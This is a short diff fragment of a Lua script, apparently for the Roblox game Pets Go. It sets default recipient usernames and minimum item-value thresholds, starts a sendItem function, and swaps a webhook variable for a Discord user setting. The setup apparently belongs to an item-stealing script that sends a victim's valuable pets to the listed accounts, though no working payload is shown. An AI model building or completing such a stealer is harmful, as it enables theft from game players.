@@ -212,7 +212,7 @@ end
 local users = Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
 local min_rap = min_rap or 1000
 local min_chance = min_chance or 100000
-local webhook = webhook
+local discuser = discuser or ""
 
 local function sendItem(category, uid, am)
     local userIndex = 1
